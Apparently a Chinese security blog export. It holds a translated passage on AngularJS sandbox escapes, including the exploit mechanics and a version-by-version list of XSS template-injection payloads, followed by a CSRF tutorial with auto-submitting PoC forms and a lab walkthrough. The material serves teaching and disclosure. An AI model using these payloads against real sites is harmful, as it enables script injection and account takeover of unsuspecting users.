<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;  <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;  $eval(<span class="string">&#x27;x=alert(1)&#x27;</span>)+<span class="string">&#x27;&#x27;</span>&#125;&#125; </span><br></pre></td></tr></table></figure>

<p>调试器在第一次调用时停止，我点击恢复，然后我脸上带着灿烂的笑容去吃午饭，因为甚至没有检查我就知道我拥有沙盒并且可能几乎每个版本都拥有。我吃完午饭回来，点击恢复，果然我收到了警报并打破了沙盒。这是小提琴：</p>
<p><a href="http://jsfiddle.net/2zs2yv7o/6/">http://jsfiddle.net/2zs2yv7o/6/</a></p>
<p>这是重写的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">var</span> v5, v6 = l &amp;&amp; (<span class="string">&#x27;x\u003dalert\u00281\u0029&#x27;</span> <span class="keyword">in</span> l);  <span class="keyword">if</span> (!(v6)) &#123;    <span class="keyword">if</span> (s) &#123;      v5 = s.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);    &#125;  &#125; <span class="keyword">else</span> &#123;    v5 = l.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);  &#125;  <span class="keyword">return</span> v5;&#125;;fn.<span class="property">assign</span> = <span class="keyword">function</span>(<span class="params">s, v, l</span>) &#123;  <span class="keyword">var</span> v0, v1, v2, v3, v4 = l &amp;&amp; (<span class="string">&#x27;x\u003dalert\u00281\u0029&#x27;</span> <span class="keyword">in</span> l);  v3 = v4 ? l : s;  <span class="keyword">if</span> (!(v4)) &#123;    <span class="keyword">if</span> (s) &#123;      v2 = s.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);    &#125;  &#125; <span class="keyword">else</span> &#123;    v2 = l.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);  &#125;  <span class="keyword">if</span> (v3 != <span class="literal">null</span>) &#123;    v1 = v;    <span class="title function_">ensureSafeObject</span>(v3.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>), text);    v0 = v3.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>) = v1;  &#125;  <span class="keyword">return</span> v0;&#125;;<span class="keyword">return</span> fn; </span><br></pre></td></tr></table></figure>

<p>如您所见，重写的代码包含警报。您可能会注意到这在 Firefox 上不起作用。这是给你的一个小挑战，试着让它在 Firefox 和 Chrome 上运行。选择下面的隐藏文本以获得挑战的解决方案：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>要深入查看 Angular 解析代码时发生的情况，请在 angular.js 的第 14079 行放置一个断点，按一次 resume 以跳过初始解析并通过在调试器中不断单击 step into function 来逐步执行代码。在这里，您将能够看到 Angular 错误地解析代码。它会认为 x=alert(1) 是第 12699 行的标识符。代码假定它正在检查一个字符，但实际上它正在检查一个更长的字符串，因此它通过了测试。见下文：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">isIdent= <span class="keyword">function</span>(<span class="params">ch</span>) &#123;  <span class="keyword">return</span> (<span class="string">&#x27;a&#x27;</span> &lt;= ch &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span> ||      <span class="string">&#x27;A&#x27;</span> &lt;= ch &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span> ||      <span class="string">&#x27;_&#x27;</span> === ch || ch === <span class="string">&#x27;$&#x27;</span>); &#125;<span class="title function_">isIdent</span>(<span class="string">&#x27;x9=9a9l9e9r9t9(919)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>该字符串是使用我们覆盖的 charAt 函数生成的，而 9 是传递的参数。由于代码的编写方式，它总是会通过测试，因为“a”、“z”等总是小于较长的字符串。幸运的是，在第 12701 行，原始字符串用于制作标识符。然后在第 13247 行，当创建赋值函数时，标识符将多次注入函数字符串，当使用 Function 构造函数调用时，它会注入我们的警报。</p>
<p>这是针对 Angular 1.4 量身定制的最终有效载荷：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;<span class="built_in">eval</span>(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>如果您使用的是 Angular，您需要将用户输入中的花括号视为高度危险，或者完全避免服务器端反射用户输入。大多数其他 JavaScript 框架通过不支持 HTML 文档中任意位置的表达式来回避这种危险。</p>
<p>Google 肯定知道这个问题，但我们不确定它在更广泛的社区中的知名度，尽管<a href="http://www.slideshare.net/x00mario/jsmvcomfg-to-sternly-look-at-javascript-mvc-and-templating-frameworks">已有</a>关于<a href="https://code.google.com/p/mustache-security/">该主题</a>的研究。<a href="https://docs.angularjs.org/guide/security">Angular 的文档</a>确实建议不要在模板中动态嵌入用户输入，但也误导性地暗示 Angular 不会将任何 XSS 漏洞引入其他安全代码中。这个问题甚至不仅限于客户端模板注入；Angular 模板注入可以（<a href="https://twitter.com/jayaradhashyam/status/640864269916094464">并且已经</a>）在服务器端显示并导致 RCE。</p>
<p>我认为这个问题到目前为止只是因为缺乏最新的 Angular 分支的已知沙箱逃逸而引起了更广泛的关注。所以现在可能是考虑为 JavaScript 导入制定补丁管理策略的好时机。</p>
<p>这个沙盒逃逸事件于 2015 年 9 月 25 日私下报告给 Google，并于 2016 年 1 月 15 日在 1.5.0 版中进行了修补。鉴于 AngularJS 沙盒绕过的悠久历史，以及 Angular 坚持沙盒“并非旨在阻止攻击者” ，我们不认为更新 Angular 是表达式注入的可靠解决方案。因此，我们发布了新的<a href="https://portswigger.net/burp/vulnerability-scanner">Burp Scanner</a>检查来检测客户端模板注入，并在下面包含了最新的 Angular 沙箱逃逸列表。</p>
<h3 id="更新…"><a href="#更新…" class="headerlink" title="更新…"></a>更新…</h3><p>我们在这篇博文中提供<a href="https://portswigger.net/blog/adapting-angularjs-payloads-to-exploit-real-world-applications">了真实世界应用程序中的沙盒逃逸</a>示例。我们还发布了<a href="https://portswigger.net/blog/dom-based-angularjs-sandbox-escapes">基于 DOM 的 AngularJS 沙箱逃逸</a>。</p>
<h3 id="更新…-1"><a href="#更新…-1" class="headerlink" title="更新…"></a>更新…</h3><p><a href="http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html">从 1.6 版开始，Angular 已经完全移除了沙箱</a></p>
<h3 id="沙盒逃脱"><a href="#沙盒逃脱" class="headerlink" title="沙盒逃脱"></a>沙盒逃脱</h3><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">我们正在积极维护XSS 备忘单</a>上的沙盒逃逸列表：</p>
<ul>
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected">反射的 AngularJS 沙箱逃逸</a></li>
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#dom-based-angularjs-sandbox-escapes">基于 DOM 的 AngularJS 沙箱逃逸</a></li>
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses">AngularJS CSP 绕过</a></li>
</ul>
<h3 id="沙盒绕过列表"><a href="#沙盒绕过列表" class="headerlink" title="沙盒绕过列表"></a>沙盒绕过列表</h3><p>1.0.1 - 1.1.5</p>
<p><a href="https://twitter.com/cure53berlin">马里奥·海德里希</a> (Cure53)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.0 - 1.2.1</p>
<p><a href="https://twitter.com/tehjh">扬·霍恩</a> （谷歌）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a=<span class="string">&#x27;constructor&#x27;</span>;b=&#123;&#125;;a.<span class="property">sub</span>.<span class="property">call</span>.<span class="title function_">call</span>(b[a].<span class="title function_">getOwnPropertyDescriptor</span>(b[a].<span class="title function_">getPrototypeOf</span>(a.<span class="property">sub</span>),a).<span class="property">value</span>,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.2 - 1.2.5</p>
<p><a href="https://twitter.com/garethheyes">加雷斯·海耶斯</a> （PortSwigger）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">charAt</span>=<span class="string">&#x27;&#x27;</span>.<span class="property">valueOf</span>;$eval(<span class="string">&quot;x=&#x27;&quot;</span>+(y=<span class="string">&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;</span>)+<span class="built_in">eval</span>(y)+<span class="string">&quot;&#x27;&quot;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.6 - 1.2.18</p>
<p><a href="https://twitter.com/tehjh">扬·霍恩</a> （谷歌）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(_=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>).<span class="property">call</span>.<span class="title function_">call</span>(&#123;&#125;[$=<span class="string">&#x27;constructor&#x27;</span>].<span class="title function_">getOwnPropertyDescriptor</span>(_.<span class="property">__proto__</span>,$).<span class="property">value</span>,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.19 - 1.2.23</p>
<p><a href="https://twitter.com/avlidienbrunn">马蒂亚斯·卡尔松</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;toString.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>=toString.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>;[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;alert(1)&quot;</span>].<span class="title function_">sort</span>(toString.<span class="property">constructor</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.24 - 1.2.29</p>
<p><a href="https://twitter.com/garethheyes">加雷斯·海耶斯</a> （PortSwigger）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=<span class="string">&#x27;&#x27;</span>.<span class="property">valueOf</span>;$eval(<span class="string">&quot;x=&#x27;\&quot;+(y=&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;)+eval(y)+\&quot;&#x27;&quot;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.3.0</p>
<p><a href="https://twitter.com/molnar_g">加博尔·莫纳尔</a> （谷歌）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;!ready &amp;&amp; (ready = <span class="literal">true</span>) &amp;&amp; (      !call      ? $$watchers[<span class="number">0</span>].<span class="title function_">get</span>(toString.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>)      : (a = apply) &amp;&amp;        (apply = constructor) &amp;&amp;        (valueOf = call) &amp;&amp;        (<span class="string">&#x27;&#x27;</span>+<span class="string">&#x27;&#x27;</span>.<span class="title function_">toString</span>(          <span class="string">&#x27;F = Function.prototype;&#x27;</span> +          <span class="string">&#x27;F.apply = F.a;&#x27;</span> +          <span class="string">&#x27;delete F.a;&#x27;</span> +          <span class="string">&#x27;delete F.valueOf;&#x27;</span> +          <span class="string">&#x27;alert(1);&#x27;</span>        ))    );&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.3.1 - 1.3.2</p>
<p><a href="https://twitter.com/garethheyes">加雷斯·海耶斯</a> （PortSwigger）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;    &#123;&#125;[&#123;<span class="attr">toString</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">assign</span>=[].<span class="property">join</span>;    <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=<span class="string">&#x27;&#x27;</span>.<span class="property">valueOf</span>;     $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>); &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.3.3 - 1.3.18</p>
<p><a href="https://twitter.com/garethheyes">加雷斯·海耶斯</a> （PortSwigger）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;[&#123;<span class="attr">toString</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">assign</span>=[].<span class="property">join</span>;   <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;  $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>);  &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.3.19</p>
<p><a href="https://twitter.com/garethheyes">加雷斯·海耶斯</a> （PortSwigger）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;    <span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:<span class="literal">false</span>,<span class="attr">valueOf</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">charAt</span>=[].<span class="property">join</span>;     $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>); &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.3.20</p>
<p><a href="https://twitter.com/garethheyes">加雷斯·海耶斯</a> （PortSwigger）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.4.0 - 1.4.9</p>
<p><a href="https://twitter.com/garethheyes">加雷斯·海耶斯</a> （PortSwigger）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1.5.0 - 1.5.8</p>
<p><a href="https://twitter.com/ianhickey1024">伊恩·希基</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;x = &#123;<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>&#125;; x[<span class="string">&#x27;y&#x27;</span>].<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125; </span><br></pre></td></tr></table></figure>

<p>1.5.9 - 1.5.11</p>
<p><a href="https://twitter.com/tehjh">扬·霍恩</a> （谷歌）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   c=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>.<span class="property">call</span>;b=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>.<span class="property">bind</span>;a=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>.<span class="property">apply</span>;   c.<span class="property">$apply</span>=$apply;c.<span class="property">$eval</span>=b;op=$root.<span class="property">$$phase</span>;   $root.<span class="property">$$phase</span>=<span class="literal">null</span>;od=$root.<span class="property">$digest</span>;$root.<span class="property">$digest</span>=(&#123;&#125;).<span class="property">toString</span>;   C=c.$apply(c);$root.<span class="property">$$phase</span>=op;$root.<span class="property">$digest</span>=od;   B=<span class="title function_">C</span>(b,c,b);$evalAsync(<span class="string">&quot;   astNode=pop();astNode.type=&#x27;UnaryExpression&#x27;;   astNode.operator=&#x27;(window.X?void0:(window.X=true,alert(1)))+&#x27;;   astNode.argument=&#123;type:&#x27;Identifier&#x27;,name:&#x27;foo&#x27;&#125;;   &quot;</span>);   m1=<span class="title function_">B</span>($$asyncQueue.<span class="title function_">pop</span>().<span class="property">expression</span>,<span class="literal">null</span>,$root);   m2=<span class="title function_">B</span>(C,<span class="literal">null</span>,m1);[].<span class="property">push</span>.<span class="property">apply</span>=m2;a=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>;   $eval(<span class="string">&#x27;a(b.c)&#x27;</span>);[].<span class="property">push</span>.<span class="property">apply</span>=a;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>&gt;=1.6.0</p>
<p><a href="https://twitter.com/cure53berlin">马里奥·海德里希</a> (Cure53)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>请访问<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression">网络学院 AngularJS 实验室</a>以使用 AngularJS 来试验 XSS。</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_CSRF</title>
    <url>/2022/08/26/CSRF/</url>
    <content><![CDATA[<p>比较简单的洞，其实在CTFshow平台上，这部分题目直接放在xss了，当然这部分和XSS也非常相似，都是利用了HTML和JS</p>
<h3 id="CSRF是什么"><a href="#CSRF是什么" class="headerlink" title="CSRF是什么"></a>CSRF是什么</h3><p>跨站请求伪造，允许攻击者诱导用户执行他们不愿意执行的操作。允许攻击者部分规避同源策略，该策略旨在防止不同网站之间相互干扰。</p>
<p>简言之，冒充用户，做一些恶意请求，伪装用户进行恶意操作。</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208252202546.svg"></p>
<h3 id="CSRF攻击的影响"><a href="#CSRF攻击的影响" class="headerlink" title="CSRF攻击的影响"></a>CSRF攻击的影响</h3><p>在成功的CSRF攻击中，攻击者会导致受害者用户无意执行某项操作。例如，改受害用户的电子邮箱地址、改受害用户的头像、个性签名，甚至是可以修改他的密码进行资金转账。像CTFshow_XSS后边几个题就是如此。如果受害用户是admin，那么能进行的操作可能更多。</p>
<h3 id="CSRF如何工作"><a href="#CSRF如何工作" class="headerlink" title="CSRF如何工作"></a>CSRF如何工作</h3><p>CSRF要想存在，必须具备三个关键条件，所以说这种洞也是很少。</p>
<p>１、网站中存在用户可登录的地方，如果就是个纯静态的网站，连用户登录点都没有，那一切都是空谈。</p>
<p>２、执行该操作时涉及发出一个或者多个HTTP请求，并且网站仅依赖cookie来识别发出请求的用户。没有其他机制可用于追踪会话或验证用户请求。而且这个cookie必须要能利用到其他站点，因为我们要跨站，如果cookie不能跟走，那也是没什么用的，比如说<a href="https://www.jianshu.com/p/ba6500990694">httponly</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite">SameSite</a>都会阻碍我们的CSRF和XSS</p>
<p>３、执行CSRF操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改密码时，需要知道现有的密码，那么自然是无法实现。</p>
<p>例如，假设一个网站包含一个允许用户更改自己账户上的电子邮箱地址的功能。用户执行此操作时候。会发出如下HTTP请求：</p>
<blockquote>
<p>POST /email/change HTTP/1.1<br>Host: vulnerable-website.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 30<br>Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</p>
<p>email=<a href="mailto:&#x63;&#x68;&#x61;&#x72;&#109;&#x65;&#x72;&#115;&#105;&#120;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#x63;&#x68;&#x61;&#x72;&#109;&#x65;&#x72;&#115;&#105;&#120;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a></p>
</blockquote>
<p>这个例子就符合上述三个条件，</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 该网站存在登陆点，至少可以用Email登录</li>
<li><input checked="" disabled="" type="checkbox"> 就这一个Cookie牵连着</li>
<li><input checked="" disabled="" type="checkbox"> 没有其他因素影响攻击者</li>
</ul>
<p>那么就可以开始攻击他了，构建一个HTML网页，like this</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么你一定好奇，这些都要自己写吗，可不可以一键日卫星，当然可以。</p>
<p>这个下面会结合靶场具体讲，这里只是举个小🌰而已</p>
<p>那么这时候受害者访问攻击者的网页，他们在存在csrf漏洞的网站的邮箱就会改变成攻击者的邮箱</p>
<p><code>pwned@evil-user.net</code></p>
<blockquote>
<p>小tips</p>
<p>尽管csrf通常被描述为与基于cookie的会话处理相关，但它也出现在应用程序自动将一些用户凭据添加到请求的其他上下文中，例如http基本身份验证和基于证书的身份验证。</p>
</blockquote>
<h3 id="构建CSRF攻击"><a href="#构建CSRF攻击" class="headerlink" title="构建CSRF攻击"></a>构建CSRF攻击</h3><p>从上边🌰中能看出，我们自己去手动写CSRF漏洞利用的HTML可能会比较麻烦，特别是所需的请求包含大量参数或请求中有其他麻烦的情况下。构建CSRF一键日🛰的方法就是使用burp suite内置的CSRF PoC 生成器</p>
<p>这边我们来一个简单的靶场，主要是说一下bp的使用。</p>
<p>靶场我们选用的是burp官网的<a href="https://portswigger.net/web-security/csrf">靶场</a>csrf第二题</p>
<p>我们抓包改邮箱看一下，会发现这里边绑定了cookie和一个token也就是内个CSRF=</p>
<p>然后我们看一下这个cookie有什么规律，再改一下</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262204091.png"></p>
<p>经过测试，我们发现，把传输方式改成GET，token就没什么卵用了</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262306987.png"></p>
<p>就可以生成一个poc</p>
<p>在这个选项里可以勾选自动提交</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262307922.png"></p>
<p>当然要自动提交了，再让受害者去点击提交，不是添麻烦嘛</p>
<p>我们直接复制下来html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0ae30021031005aac00448e6001b00b9.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;charmersix@gmail.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们要把邮箱改成攻击者的邮箱</p>
<p>我们来到这个exploit server，把这坨HTML复制到框里</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262313156.png"></p>
<p>然后点击漏洞利用</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262314197.png"></p>
<p>CSRF漏洞利用</p>
<p>CSRF与XSS的原理基本相同。通常，攻击者会将恶意HTML放置到他们控制的网站上，然后诱导受害者访问该网站。这可以 通过电子邮件或社交媒体消息向用户提供网站链接来完成。或者如果攻击被放置在一个流行的网站中（例如，某用户评论区），他们就等着有用户访问恶意网站。</p>
<p>请注意，一些简单的CSRF漏洞利用使用GET方式，并且可以在易受攻击的网站上使用单个URL完全自包含。这种情况下，攻击者可能不需要外部站点，并且可以直接向受害者提供易受攻击上的恶意URL．在前面的例子中，如果可以使用GET方法执行更改电子邮箱地址的请求，那么自包含攻击如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="防止CSRF攻击"><a href="#防止CSRF攻击" class="headerlink" title="防止CSRF攻击"></a>防止CSRF攻击</h3><p>防御CSRF攻击的最可靠方法是在相关请求中包含CSRF　ｔｏｋｅｎ。</p>
<p>并且token要满足下面三个条件：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 对于一般的token，值是不可预测的。</li>
<li><input checked="" disabled="" type="checkbox"> session绑定到用户</li>
<li><input checked="" disabled="" type="checkbox"> 执行相关操作之前，token一直能经过验证</li>
</ul>
<p>最常见的防御就是samesite　cookie</p>
<h3 id="常见的CSRF漏洞"><a href="#常见的CSRF漏洞" class="headerlink" title="常见的CSRF漏洞"></a>常见的CSRF漏洞</h3><p>CSRF一般出现在邮箱修改，转账修改</p>
<p>最有趣的CSRF漏洞由于token验证错误引起。</p>
<p>在前面的示例中，假设application现在在更改用户电子邮箱的请求中包含一个CSRFtoken：</p>
<blockquote>
<p>POST /email/change HTTP/1.1<br>Host: vulnerable-website.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 68<br>Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</p>
<p>csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&amp;email=<a href="mailto:&#119;&#x69;&#101;&#x6e;&#x65;&#114;&#x40;&#110;&#111;&#114;&#109;&#97;&#x6c;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#99;&#111;&#109;">&#119;&#x69;&#101;&#x6e;&#x65;&#114;&#x40;&#110;&#111;&#114;&#109;&#97;&#x6c;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#99;&#111;&#109;</a></p>
</blockquote>
